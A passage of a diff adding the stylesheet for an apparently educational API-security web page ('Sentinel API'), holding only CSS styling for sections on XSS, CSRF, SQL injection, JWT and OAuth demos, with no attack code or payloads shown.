@@ -1,0 +1,2822 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sentinel API — The Invisible Perimeter</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700&family=Geist+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+/* ─── TOKENS ────────────────────────────────────── */
+:root {
+  --bg:       #0a0a0f;
+  --bg2:      #0f0f18;
+  --surface:  #12121b;
+  --surface2: #18182a;
+  --border:   rgba(200,180,255,0.08);
+  --border2:  rgba(180,150,255,0.12);
+  --text:     #e8e5f5;
+  --muted:    #7a7590;
+  --muted2:   #a8a0be;
+  --teal:     #b89fff;
+  --teal-dim: rgba(184,159,255,0.12);
+  --teal-glow:rgba(184,159,255,0.25);
+  --red:      #ff5d6d;
+  --red-dim:  rgba(255,93,109,0.12);
+  --amber:    #ffc799;
+  --amber-dim:rgba(255,199,153,0.12);
+  --blue:     #8fb3ff;
+  --blue-dim: rgba(143,179,255,0.1);
+  --purple:   #c4b5fd;
+  --safe:     #a78bfa;
+  --fw:       'Geist', sans-serif;
+  --fm:       'Geist Mono', monospace;
+  --fi:       'Geist', sans-serif;
+}
+
+*,*::before,*::after { box-sizing:border-box; margin:0; padding:0; }
+html { scroll-behavior:smooth; }
+
+body {
+  font-family: var(--fw);
+  background: var(--bg);
+  color: var(--text);
+  overflow-x: hidden;
+  cursor: none;
+  font-weight: 400;
+  letter-spacing: 0.3px;
+}
+
+/* scrollbar */
+::-webkit-scrollbar { width:3px; }
+::-webkit-scrollbar-track { background:var(--bg); }
+::-webkit-scrollbar-thumb { background:var(--teal); border-radius:2px; }
+
+/* ─── CURSOR ───────────────────────────────────── */
+#cur { position:fixed; width:10px; height:10px; background:var(--teal); border-radius:50%; pointer-events:none; z-index:9999; transform:translate(-50%,-50%); transition:transform .1s; mix-blend-mode:difference; }
+#cur-ring { position:fixed; width:32px; height:32px; border:1px solid rgba(0,200,160,.4); border-radius:50%; pointer-events:none; z-index:9998; transform:translate(-50%,-50%); transition:width .2s,height .2s; }
+body:hover #cur { opacity:1; }
+
+/* ─── PROGRESS ─────────────────────────────────── */
+#prog { position:fixed; top:0; left:0; height:2px; background:linear-gradient(90deg,var(--teal),var(--blue)); z-index:1000; width:0; transition:width .08s linear; }
+
+/* ─── SIDEBAR NAV ──────────────────────────────── */
+.sidebar {
+  position: fixed;
+  left: 0; top: 0; bottom: 0;
+  width: 220px;
+  background: rgba(10,13,20,0.95);
+  backdrop-filter: blur(20px);
+  border-right: 1px solid var(--border);
+  z-index: 200;
+  display: flex;
+  flex-direction: column;
+  padding: 2rem 0;
+  transition: transform .3s ease;
+}
+.sb-logo {
+  padding: 0 1.5rem 2rem;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 1.5rem;
+}
+.sb-logo-text {
+  font-family: var(--fw);
+  font-weight: 800;
+  font-size: 1rem;
+  color: var(--teal);
+  letter-spacing: -0.02em;
+}
+.sb-logo-sub {
+  font-size: 0.6rem;
+  color: var(--muted);
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  margin-top: 0.2rem;
+}
+.sb-section {
+  padding: 0 1rem 1.5rem;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 1rem;
+}
+.sb-section-label {
+  font-size: 0.55rem;
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  color: var(--muted);
+  padding: 0 0.5rem;
+  margin-bottom: 0.5rem;
+}
+.sb-link {
+  display: flex;
+  align-items: center;
+  gap: 0.6rem;
+  padding: 0.5rem 0.75rem;
+  border-radius: 6px;
+  font-size: 0.72rem;
+  color: var(--muted2);
+  text-decoration: none;
+  transition: background .2s, color .2s;
+  cursor: none;
+  margin-bottom: 0.15rem;
+}
+.sb-link:hover, .sb-link.active { background: var(--teal-dim); color: var(--teal); }
+.sb-link .sb-icon { width: 16px; text-align: center; font-size: 0.8rem; }
+.sb-link .sb-dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  margin-left: auto;
+  flex-shrink: 0;
+}
+.sb-dot-critical { background: var(--red); }
+.sb-dot-high { background: var(--amber); }
+.sb-dot-medium { background: var(--teal); }
+.sb-footer {
+  margin-top: auto;
+  padding: 1rem 1.5rem 0;
+  border-top: 1px solid var(--border);
+  font-size: 0.6rem;
+  color: var(--muted);
+  line-height: 1.6;
+}
+.sb-status {
+  display: flex;
+  align-items: center;
+  gap: 0.4rem;
+  margin-bottom: 0.25rem;
+}
+.sb-status-dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--safe);
+  animation: blink 2s ease infinite;
+}
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }
+
+/* ─── MAIN WRAPPER ─────────────────────────────── */
+.main { margin-left: 220px; }
+
+/* ─── NOISE OVERLAY ───────────────────────────── */
+.main::before {
+  content:'';
+  position:fixed;
+  inset:0;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.035'/%3E%3C/svg%3E");
+  pointer-events:none;
+  z-index:9990;
+  left:220px;
+}
+
+/* ─── TOP BAR ──────────────────────────────────── */
+.topbar {
+  position: fixed;
+  top: 0;
+  left: 220px; right: 0;
+  height: 52px;
+  background: rgba(7,9,15,0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  z-index: 150;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 2.5rem;
+}
+.topbar-path {
+  font-size: 0.65rem;
+  color: var(--muted);
+  letter-spacing: 0.05em;
+}
+.topbar-path span { color: var(--teal); }
+.topbar-actions { display: flex; gap: 1rem; align-items: center; }
+.tb-btn {
+  background: var(--teal);
+  color: var(--bg);
+  border: none;
+  padding: 0.4rem 1rem;
+  border-radius: 4px;
+  font-family: var(--fw);
+  font-weight: 700;
+  font-size: 0.68rem;
+  cursor: none;
+  letter-spacing: 0.04em;
+}
+.tb-btn-ghost {
+  background: transparent;
+  color: var(--muted2);
+  border: 1px solid var(--border);
+  padding: 0.4rem 1rem;
+  border-radius: 4px;
+  font-family: var(--fw);
+  font-weight: 600;
+  font-size: 0.68rem;
+  cursor: none;
+}
+
+/* ─── HERO ─────────────────────────────────────── */
+.hero {
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  padding: 6rem 3rem 4rem;
+  position: relative;
+  overflow: hidden;
+}
+
+/* Cinematic BG layers */
+.hero-layer {
+  position: absolute;
+  inset: 0;
+  will-change: transform;
+}
+.hero-bg1 {
+  background:
+    radial-gradient(ellipse 70% 60% at 60% 40%, rgba(0,200,160,0.07) 0%, transparent 65%),
+    radial-gradient(ellipse 50% 40% at 85% 80%, rgba(76,201,240,0.04) 0%, transparent 60%),
+    radial-gradient(ellipse 40% 50% at 10% 30%, rgba(255,69,83,0.03) 0%, transparent 60%);
+}
+.hero-grid {
+  background-image:
+    linear-gradient(rgba(0,200,160,0.04) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,200,160,0.04) 1px, transparent 1px);
+  background-size: 48px 48px;
+  mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 20%, transparent 75%);
+}
+.hero-vignette {
+  background: radial-gradient(ellipse 100% 100% at 50% 50%, transparent 30%, var(--bg) 100%);
+}
+/* Animated scan line */
+.hero-scan {
+  position: absolute;
+  left: 0; right: 0;
+  height: 1px;
+  background: linear-gradient(90deg, transparent, var(--teal), transparent);
+  opacity: 0.4;
+  animation: scanMove 8s ease-in-out infinite;
+}
+@keyframes scanMove {
+  0% { top: 20%; opacity: 0; }
+  10% { opacity: 0.4; }
+  90% { opacity: 0.4; }
+  100% { top: 80%; opacity: 0; }
+}
+
+.hero-content { position:relative; z-index:2; max-width: 640px; }
+
+.hero-eyebrow {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.6rem;
+  background: rgba(0,200,160,0.08);
+  border: 1px solid rgba(0,200,160,0.2);
+  color: var(--teal);
+  padding: 0.38rem 1rem;
+  border-radius: 2px;
+  font-size: 0.62rem;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  margin-bottom: 2.5rem;
+  animation: fadeUp .8s ease both;
+}
+.hero-eyebrow::before {
+  content:'';
+  width:6px; height:6px;
+  background:var(--teal);
+  border-radius:50%;
+  animation:blink 2s ease infinite;
+}
+
+.hero-title {
+  font-family: var(--fw);
+  font-size: clamp(3rem,6vw,5.5rem);
+  font-weight: 800;
+  line-height: 0.96;
+  letter-spacing: -0.03em;
+  margin-bottom: 1.75rem;
+  animation: fadeUp .8s .1s ease both;
+}
+.hero-title .hl {
+  color: var(--teal);
+  font-family: var(--fi);
+  font-style: italic;
+  font-weight: 400;
+}
+
+.hero-lead {
+  font-family: var(--fi);
+  font-style: italic;
+  font-size: 1.15rem;
+  color: var(--muted2);
+  line-height: 1.7;
+  max-width: 520px;
+  margin-bottom: 2.75rem;
+  animation: fadeUp .8s .2s ease both;
+}
+
+.hero-cta {
+  display: flex;
+  gap: 0.75rem;
+  animation: fadeUp .8s .3s ease both;
+}
+.btn-p {
+  background: var(--teal);
+  color: var(--bg);
+  border: none;
+  padding: 0.75rem 1.75rem;
+  border-radius: 3px;
+  font-family: var(--fw);
+  font-weight: 700;
+  font-size: 0.8rem;
+  cursor: none;
+  letter-spacing: 0.04em;
+  transition: box-shadow .2s, transform .2s;
+  text-decoration: none;
+  display: inline-block;
+}
+.btn-p:hover { transform: translateY(-2px); box-shadow: 0 8px 28px rgba(0,200,160,.3); }
+.btn-g {
+  background: transparent;
+  color: var(--text);
+  border: 1px solid var(--border);
+  padding: 0.75rem 1.75rem;
+  border-radius: 3px;
+  font-family: var(--fw);
+  font-weight: 600;
+  font-size: 0.8rem;
+  cursor: none;
+  text-decoration: none;
+  transition: border-color .2s, color .2s;
+  display: inline-block;
+}
+.btn-g:hover { border-color: var(--teal); color: var(--teal); }
+
+.hero-metrics {
+  display: flex;
+  gap: 3rem;
+  margin-top: 4rem;
+  padding-top: 2.5rem;
+  border-top: 1px solid var(--border);
+  animation: fadeUp .8s .4s ease both;
+}
+.metric-val {
+  font-family: var(--fw);
+  font-size: 2.2rem;
+  font-weight: 800;
+  color: var(--teal);
+  line-height: 1;
+}
+.metric-label {
+  font-size: 0.6rem;
+  color: var(--muted);
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  margin-top: 0.35rem;
+}
+
+/* Hero terminal — right side */
+.hero-terminal {
+  position: absolute;
+  right: 3rem;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 400px;
+  background: rgba(10,14,22,0.9);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  overflow: hidden;
+  box-shadow: 0 40px 80px rgba(0,0,0,.6), 0 0 0 1px rgba(0,200,160,.06);
+  animation: fadeUp .8s .5s ease both;
+  z-index: 2;
+}
+.term-bar {
+  background: var(--surface2);
+  padding: .7rem 1rem;
+  display: flex;
+  align-items: center;
+  gap: .45rem;
+  border-bottom: 1px solid var(--border);
+}
+.td { width:10px; height:10px; border-radius:50%; }
+.td-r{background:#ff5f57;} .td-y{background:#febc2e;} .td-g{background:#28c840;}
+.term-title { margin:0 auto; font-size:.6rem; color:var(--muted); letter-spacing:.06em; }
+.term-body { padding:1.25rem 1.5rem; font-size:.7rem; line-height:2.1; }
+.tc { color:#3d4a65; }
+.tk { color:var(--blue); }
+.tv { color:var(--teal); }
+.ts { color:var(--amber); }
+.td2 { color:var(--red); }
+.tw { color:var(--amber); }
+.tcur { display:inline-block; width:7px; height:.9em; background:var(--teal); vertical-align:middle; animation:blink 1s step-end infinite; }
+
+@keyframes fadeUp {
+  from { opacity:0; transform:translateY(28px); }
+  to { opacity:1; transform:translateY(0); }
+}
+
+/* ─── SECTION BASE ─────────────────────────────── */
+.section {
+  padding: 6rem 3rem;
+  position: relative;
+  overflow: hidden;
+}
+.section-alt { background: var(--bg2); }
+.section-dark { background: var(--surface); }
+
+.sec-num {
+  font-size: .6rem;
+  letter-spacing: .15em;
+  color: var(--muted);
+  text-transform: uppercase;
+  margin-bottom: .6rem;
+}
+.sec-title {
+  font-family: var(--fw);
+  font-size: clamp(2rem, 4vw, 3.2rem);
+  font-weight: 800;
+  letter-spacing: -0.025em;
+  line-height: 1.05;
+  margin-bottom: .75rem;
+}
+.sec-subtitle {
+  font-family: var(--fi);
+  font-style: italic;
+  font-size: 1.05rem;
+  color: var(--muted2);
+  max-width: 520px;
+  line-height: 1.65;
+  margin-bottom: 3rem;
+}
+
+/* ─── TWO-COL LAYOUT ───────────────────────────── */
+.two-col {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 4rem;
+  align-items: start;
+}
+.two-col.flip { direction: rtl; }
+.two-col.flip > * { direction: ltr; }
+
+/* ─── TOPIC BADGE ──────────────────────────────── */
+.t-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: .45rem;
+  padding: .3rem .85rem;
+  border-radius: 2px;
+  font-size: .62rem;
+  font-weight: 700;
+  font-family: var(--fw);
+  letter-spacing: .1em;
+  text-transform: uppercase;
+  margin-bottom: 1.25rem;
+}
+.badge-red { background:var(--red-dim); border:1px solid rgba(255,69,83,.25); color:var(--red); }
+.badge-amber { background:var(--amber-dim); border:1px solid rgba(255,179,64,.25); color:var(--amber); }
+.badge-teal { background:var(--teal-dim); border:1px solid rgba(0,200,160,.25); color:var(--teal); }
+.badge-blue { background:var(--blue-dim); border:1px solid rgba(76,201,240,.25); color:var(--blue); }
+.badge-purple { background:rgba(167,139,250,.1); border:1px solid rgba(167,139,250,.25); color:var(--purple); }
+
+/* ─── CONTENT BLOCKS ───────────────────────────── */
+.topic-title {
+  font-family: var(--fw);
+  font-size: clamp(1.6rem,3vw,2.5rem);
+  font-weight: 800;
+  letter-spacing: -0.02em;
+  line-height: 1.1;
+  margin-bottom: .75rem;
+}
+.topic-sub {
+  font-family: var(--fi);
+  font-style: italic;
+  font-size: 1rem;
+  color: var(--muted2);
+  line-height: 1.65;
+  margin-bottom: 1.25rem;
+}
+.topic-body {
+  font-size: .78rem;
+  color: #7a8aaa;
+  line-height: 2;
+  margin-bottom: 1.75rem;
+}
+
+/* Attack flow */
+.flow {
+  margin: 1.75rem 0;
+  border-left: 1px solid var(--border);
+  padding-left: 1.5rem;
+}
+.flow-label {
+  font-size: .6rem;
+  letter-spacing: .12em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: .75rem;
+}
+.flow-step {
+  position: relative;
+  padding: .65rem 0;
+  font-size: .75rem;
+  color: #7a8aaa;
+  line-height: 1.65;
+  border-bottom: 1px solid rgba(255,255,255,.03);
+}
+.flow-step:last-child { border-bottom: none; }
+.flow-step::before {
+  content: attr(data-n);
+  position: absolute;
+  left: -1.88rem;
+  width: 18px; height: 18px;
+  background: var(--step-c, var(--teal));
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: .6rem;
+  font-weight: 700;
+  color: var(--bg);
+  font-family: var(--fw);
+}
+.flow-step strong { color: var(--text); font-weight: 500; }
+
+/* Cards row */
+.cards-2 {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: .75rem;
+  margin-top: 1.5rem;
+}
+.mini-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1.1rem;
+}
+.mini-card-t {
+  font-family: var(--fw);
+  font-weight: 700;
+  font-size: .75rem;
+  margin-bottom: .65rem;
+  display: flex;
+  align-items: center;
+  gap: .45rem;
+}
+.mini-card ul {
+  list-style: none;
+  font-size: .7rem;
+  color: #7a8aaa;
+  line-height: 1.95;
+}
+.mini-card ul li::before { content:'→ '; color:var(--teal); }
+.mini-card ul li.neg::before { color:var(--red); }
+.mini-card ul li.warn::before { color:var(--amber); }
+
+/* Real world */
+.rw-box {
+  background: rgba(0,200,160,.04);
+  border: 1px solid rgba(0,200,160,.12);
+  border-radius: 6px;
+  padding: 1.1rem 1.25rem;
+  margin-top: 1.5rem;
+}
+.rw-label {
+  font-size: .58rem;
+  letter-spacing: .13em;
+  text-transform: uppercase;
+  color: var(--teal);
+  margin-bottom: .5rem;
+  display: flex;
+  align-items: center;
+  gap: .4rem;
+}
+.rw-label::before { content:'◆'; font-size:.48rem; }
+.rw-text { font-size:.76rem; color:#7a8aaa; line-height:1.85; }
+.rw-text strong { color:var(--text); font-weight:500; }
+
+/* ─── CODE BLOCK ───────────────────────────────── */
+.code-block {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  overflow: hidden;
+  font-size: .7rem;
+  line-height: 1.95;
+}
+.cb-head {
+  background: var(--surface2);
+  padding: .55rem 1rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  border-bottom: 1px solid var(--border);
+}
+.cb-lang { font-size:.58rem; color:var(--muted); letter-spacing:.1em; text-transform:uppercase; }
+.cb-tag {
+  font-size: .58rem;
+  padding: .18rem .55rem;
+  border-radius: 2px;
+}
+.tag-bad { background:rgba(255,69,83,.12); color:var(--red); border:1px solid rgba(255,69,83,.25); }
+.tag-good { background:rgba(34,211,160,.12); color:var(--safe); border:1px solid rgba(34,211,160,.25); }
+.cb-body { padding: 1.1rem 1.5rem; }
+.cc { color:#3d4a65; }
+.ck { color:var(--blue); }
+.cs { color:var(--amber); }
+.cf { color:var(--purple); }
+.cn { color:var(--teal); }
+.cbad { color:var(--red); }
+.cgood { color:var(--safe); }
+
+/* ─── VISUAL PANELS ────────────────────────────── */
+.vis-panel {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  overflow: hidden;
+  box-shadow: 0 24px 60px rgba(0,0,0,.45);
+  position: sticky;
+  top: 5rem;
+}
+.vis-head {
+  background: var(--surface2);
+  padding: .85rem 1.25rem;
+  display: flex;
+  align-items: center;
+  gap: .5rem;
+  border-bottom: 1px solid var(--border);
+}
+.vis-title { font-family:var(--fw); font-weight:700; font-size:.76rem; }
+.vis-badge {
+  margin-left:auto;
+  font-size:.58rem;
+  padding:.18rem .55rem;
+  border-radius:2px;
+}
+.vis-body { padding: 1.25rem; }
+
+/* Rate limit meters */
+.meter-row {
+  display: flex;
+  align-items: center;
+  gap: .75rem;
+  margin-bottom: .7rem;
+  font-size: .7rem;
+}
+.ml { width:70px; color:var(--muted2); }
+.mbar { flex:1; height:7px; background:var(--surface2); border-radius:3px; overflow:hidden; }
+.mfill { height:100%; border-radius:3px; transition: width 1.2s cubic-bezier(.23,1,.32,1); }
+.m-safe{background:var(--safe);}
+.m-warn{background:var(--amber); animation:none;}
+.m-red{background:var(--red); animation:mpulse 1s ease infinite;}
+@keyframes mpulse { 0%,100%{opacity:1} 50%{opacity:.45} }
+.mv { width:38px; text-align:right; font-size:.65rem; }
+.rate-alert {
+  background: rgba(255,69,83,.07);
+  border: 1px solid rgba(255,69,83,.2);
+  border-radius:5px;
+  padding:.75rem 1rem;
+  font-size:.7rem;
+  color:var(--red);
+  display:flex;
+  align-items:center;
+  gap:.6rem;
+  margin-top:.25rem;
+}
+.rdot { width:7px; height:7px; border-radius:50%; background:var(--red); animation:mpulse 1s ease infinite; }
+
+/* CORS diagram */
+.cors-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: .65rem .85rem;
+  border-radius:5px;
+  border:1px solid var(--border);
+  margin-bottom:.45rem;
+  font-size:.7rem;
+}
+.cors-origin { color:var(--blue); }
+.cors-status {
+  font-size:.6rem;
+  padding:.18rem .55rem;
+  border-radius:2px;
+  font-family:var(--fw);
+  font-weight:700;
+}
+.cs-ok { background:rgba(34,211,160,.12); color:var(--safe); }
+.cs-warn { background:rgba(255,179,64,.12); color:var(--amber); }
+.cs-block { background:rgba(255,69,83,.12); color:var(--red); }
+.cors-arrow { text-align:center; font-size:.6rem; color:var(--muted); padding:.25rem 0; }
+
+/* SQL Compare */
+.sql-cmp { display:flex; flex-direction:column; gap:.85rem; }
+.sql-row {}
+.sql-rlabel { font-size:.58rem; letter-spacing:.12em; text-transform:uppercase; margin-bottom:.35rem; }
+.sql-bad .sql-rlabel { color:var(--red); }
+.sql-good .sql-rlabel { color:var(--safe); }
+.sql-code {
+  background:var(--bg);
+  border-radius:5px;
+  padding:.75rem 1rem;
+  font-size:.68rem;
+  line-height:1.8;
+  border-left:2px solid;
+}
+.sql-bad .sql-code { border-color:var(--red); }
+.sql-good .sql-code { border-color:var(--safe); }
+
+/* CSRF actors */
+.csrf-actor {
+  display:flex;
+  align-items:center;
+  gap:.65rem;
+  padding:.65rem .85rem;
+  border-radius:5px;
+  border:1px solid var(--border);
+  margin-bottom:.35rem;
+  font-size:.7rem;
+}
+.aicon {
+  width:30px; height:30px;
+  border-radius:50%;
+  display:flex; align-items:center; justify-content:center;
+  font-size:.9rem; flex-shrink:0;
+}
+.ai-v{background:rgba(76,201,240,.12);}
+.ai-a{background:rgba(255,69,83,.12);}
+.ai-s{background:rgba(34,211,160,.12);}
+.aname { font-family:var(--fw); font-weight:700; font-size:.72rem; }
+.adesc { color:var(--muted); font-size:.62rem; }
+.csrf-arrow { text-align:center; font-size:.62rem; color:var(--red); padding:.15rem 0; }
+
+/* XSS demo */
+.xss-input {
+  width:100%;
+  background:var(--bg);
+  border:1px solid rgba(255,69,83,.35);
+  border-radius:4px;
+  padding:.5rem .75rem;
+  font-family:var(--fm);
+  font-size:.68rem;
+  color:var(--red);
+  outline:none;
+  margin-bottom:.5rem;
+}
+.xss-controls { display:flex; gap:.5rem; margin-bottom:.75rem; }
+.xss-btn-bad {
+  background:var(--red);
+  color:#fff;
+  border:none;
+  padding:.42rem .85rem;
+  border-radius:3px;
+  font-size:.65rem;
+  cursor:none;
+  font-family:var(--fw);
+  font-weight:700;
+}
+.xss-btn-safe {
+  background:var(--teal-dim);
+  color:var(--teal);
+  border:1px solid rgba(0,200,160,.25);
+  padding:.42rem .85rem;
+  border-radius:3px;
+  font-size:.65rem;
+  cursor:none;
+  font-family:var(--fw);
+  font-weight:700;
+}
+.xss-out {
+  background:var(--bg);
+  border:1px solid var(--border);
+  border-radius:5px;
+  padding:.85rem 1rem;
+  font-size:.7rem;
+  min-height:70px;
+  color:#7a8aaa;
+  line-height:1.75;
+}
+.xss-warn {
+  margin-top:.5rem;
+  background:rgba(255,69,83,.07);
+  border:1px solid rgba(255,69,83,.2);
+  border-radius:4px;
+  padding:.5rem .75rem;
+  font-size:.68rem;
+  color:var(--red);
+}
+
+/* JWT visual */
+.jwt-parts { display:flex; flex-direction:column; gap:.5rem; margin-bottom:1rem; }
+.jwt-part {
+  border-radius:5px;
+  padding:.7rem 1rem;
+  font-size:.68rem;
+}
+.jp-head { background:rgba(255,69,83,.08); border:1px solid rgba(255,69,83,.2); }
+.jp-pay { background:rgba(255,179,64,.08); border:1px solid rgba(255,179,64,.2); }
+.jp-sig { background:rgba(0,200,160,.08); border:1px solid rgba(0,200,160,.2); }
+.jp-label {
+  font-size:.56rem;
+  letter-spacing:.12em;
+  text-transform:uppercase;
+  margin-bottom:.35rem;
+  font-family:var(--fw);
+  font-weight:700;
+}
+.jp-head .jp-label { color:var(--red); }
+.jp-pay .jp-label { color:var(--amber); }
+.jp-sig .jp-label { color:var(--teal); }
+.jp-content { color:#9aabcc; font-size:.67rem; line-height:1.7; }
+
+/* OAuth flow */
+.oauth-flow { display:flex; flex-direction:column; gap:0; }
+.of-step {
+  display:flex;
+  align-items:center;
+  gap:.75rem;
+  padding:.65rem 0;
+  font-size:.7rem;
+  color:#7a8aaa;
+  border-bottom:1px solid rgba(255,255,255,.03);
+}
+.of-step:last-child { border-bottom:none; }
+.of-num {
+  width:22px; height:22px;
+  border-radius:50%;
+  background:var(--teal-dim);
+  border:1px solid rgba(0,200,160,.25);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:.6rem;
+  font-family:var(--fw);
+  font-weight:700;
+  color:var(--teal);
+  flex-shrink:0;
+}
+.of-text strong { color:var(--text); font-weight:500; }
+
+/* ─── THREAT GRID ──────────────────────────────── */
+.threat-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(180px,1fr));
+  gap: 1px;
+  background: var(--border);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  overflow: hidden;
+  margin-top: 3rem;
+}
+.threat-card {
+  background: var(--surface);
+  padding: 1.75rem;
+  cursor: none;
+  transition: background .25s;
+  position: relative;
+  overflow: hidden;
+}
+.threat-card:hover { background: var(--surface2); }
+.threat-card::after {
+  content:'';
+  position:absolute;
+  bottom:0; left:0; right:0;
+  height:2px;
+  background:var(--tc,var(--teal));
+  transform:scaleX(0);
+  transition:transform .3s ease;
+  transform-origin:left;
+}
+.threat-card:hover::after { transform:scaleX(1); }
+.tc-icon { font-size:1.4rem; margin-bottom:.85rem; }
+.tc-name { font-family:var(--fw); font-weight:700; font-size:.85rem; margin-bottom:.3rem; }
+.tc-risk { font-size:.6rem; letter-spacing:.1em; text-transform:uppercase; }
+.risk-c { color:var(--red); }
+.risk-h { color:var(--amber); }
+
+/* ─── TICKER ───────────────────────────────────── */
+.ticker {
+  background:rgba(0,200,160,.04);
+  border-top:1px solid rgba(0,200,160,.08);
+  border-bottom:1px solid rgba(0,200,160,.08);
+  padding:.65rem 0;
+  overflow:hidden;
+  white-space:nowrap;
+}
+.tick-track { display:inline-flex; animation:tick 35s linear infinite; }
+.tick-item { font-size:.65rem; letter-spacing:.09em; color:var(--teal); padding:0 2.5rem; text-transform:uppercase; }
+.tick-sep { color:rgba(0,200,160,.3); }
+@keyframes tick { 0%{transform:translateX(0)} 100%{transform:translateX(-50%)} }
+
+/* ─── BEST PRACTICES ───────────────────────────── */
+.prac-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(290px,1fr));
+  gap: 1.25rem;
+  margin-top: 3rem;
+}
+.prac-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.75rem;
+  position: relative;
+  overflow: hidden;
+  cursor: none;
+  transition: transform .3s ease, border-color .3s;
+}
+.prac-card:hover { transform:translateY(-4px); border-color:rgba(0,200,160,.2); }
+.prac-card::before {
+  content:'';
+  position:absolute;
+  top:0; left:0; right:0;
+  height:2px;
+  background:var(--pc,var(--teal));
+}
+.pnum {
+  font-family:var(--fw);
+  font-size:3rem;
+  font-weight:800;
+  color:rgba(255,255,255,.03);
+  position:absolute;
+  top:1rem; right:1.25rem;
+  line-height:1;
+}
+.picon { font-size:1.4rem; margin-bottom:.85rem; }
+.ptitle { font-family:var(--fw); font-size:.95rem; font-weight:700; margin-bottom:.65rem; }
+.pbody { font-size:.76rem; color:#7a8aaa; line-height:1.9; margin-bottom:1rem; cursor: pointer; }
+.prac-card { position: relative; overflow: hidden; cursor: pointer; transition: transform .3s ease, border-color .3s, box-shadow .3s; }
+.prac-card:hover { transform: translateY(-4px); border-color: rgba(0,200,160,.2); box-shadow: 0 12px 40px rgba(184,159,255,0.15); }
+
+/* ─── MODAL STYLES ─────────────────────────────── */
+.modal-overlay { display: none; position: fixed; inset: 0; background: rgba(10,10,15,0.85); backdrop-filter: blur(4px); z-index: 500; animation: fadeIn 0.3s ease; }
+.modal-overlay.active { display: flex; align-items: center; justify-content: center; }
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+@keyframes slideUp { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+.modal-content {
+  background: linear-gradient(135deg, var(--surface) 0%, var(--surface2) 100%);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  width: 90%;
+  max-width: 900px;
+  max-height: 85vh;
+  overflow-y: auto;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+  animation: slideUp 0.4s cubic-bezier(0.34,1.56,0.64,1);
+  position: relative;
+}
+
+.modal-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 2rem;
+  border-bottom: 1px solid var(--border);
+}
+
+.modal-header h2 {
+  font-family: var(--fw);
+  font-size: 1.5rem;
+  font-weight: 700;
+  color: var(--text);
+  letter-spacing: -0.02em;
+  margin: 0;
+}
+
+.modal-close {
+  background: transparent;
+  border: none;
+  font-size: 1.5rem;
+  color: var(--muted2);
+  cursor: pointer;
+  transition: color 0.2s ease;
+  padding: 0.5rem;
+  line-height: 1;
+}
+
+.modal-close:hover { color: var(--teal); }
+
+.modal-body {
+  padding: 2rem;
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 2rem;
+  align-items: start;
+}
+
+.modal-canvas-wrap {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 1.5rem;
+  min-height: 400px;
+}
+
+.modal-canvas-wrap canvas {
+  display: block;
+  max-width: 100%;
+  height: auto;
+}
+
+.modal-content-wrap {
+  display: flex;
+  flex-direction: column;
+  gap: 1.5rem;
+}
+
+.modal-concept {
+  padding: 1.5rem;
+  background: var(--bg);
+  border-left: 3px solid var(--teal);
+  border-radius: 8px;
+}
+
+.modal-concept h3 {
+  font-family: var(--fw);
+  font-size: 0.95rem;
+  font-weight: 700;
+  color: var(--teal);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  margin-bottom: 0.5rem;
+  margin-top: 0;
+}
+
+.modal-concept p {
+  font-size: 0.85rem;
+  line-height: 1.6;
+  color: var(--muted2);
+  margin: 0;
+}
+
+.modal-tools {
